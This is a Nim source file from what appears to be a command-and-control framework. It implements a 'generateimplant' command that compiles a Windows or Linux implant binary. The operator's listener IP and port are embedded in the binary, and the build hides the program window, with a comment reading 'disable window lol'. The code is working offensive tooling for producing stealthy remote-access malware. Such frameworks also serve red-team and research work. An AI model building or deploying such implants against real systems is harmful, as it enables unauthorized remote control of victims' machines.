
import osproc, strutils, asyncdispatch

import ../../types
import ../../logging

proc execProc*(args: seq[string], server: C2Server) {.async.} =
  let argsn = len(args)
  var platform: string
  var ip: string
  var port: string
  var failed = false
  if argsn >= 3:
    let args_split = args[1].split(":")
    if argsn == 3:
      let listenerType = args_split[0]
      platform = args[2]
      if listenerType == "tcp":
        let listenerId = parseInt(args_split[1])
        if len(server.tcpListeners) > listenerId:
          let tcpListener = server.tcpListeners[listenerId]
          infoLog "generating implant for " & $tcpListener
          ip = tcpListener.listeningIP
          if ip == "0.0.0.0":
            errorLog "can't automatically generate an implant for this listener because the listening ip is set to 0.0.0.0, you need to use the other command usage format"
            errorLog "generateimplant tcp (ip) (port) (platform)"
            failed = true
          port = $tcpListener.port
        else:
          errorLog "couldn't find tcp listener"
    elif argsn == 5:
      platform = args[4]
      ip = args[2]
      port = args[3]
    if not failed:
      let compileCommand = "nim c -d:client " &
        "--app=gui " & # disable window lol 
        "-d:ip=" & ip & " " & 
        "-d:port=" & port & " " & 
        (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
        "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
        "./src/client/client.nim"
      echo "Running " & compileCommand
      let exitCode = execCmd(compileCommand)
      if exitCode != 0:
        errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
      else:
        infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
  else:
      errorLog "incorrect usage, check https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  argsLength: 3,
  usage: @[
    "generateimplant [listenerID] [platform]",
    "generateimplant [listenerType] [ip] [port] [platform]",
  ],
  description: "Generate an implant",
  category: CCImplants
)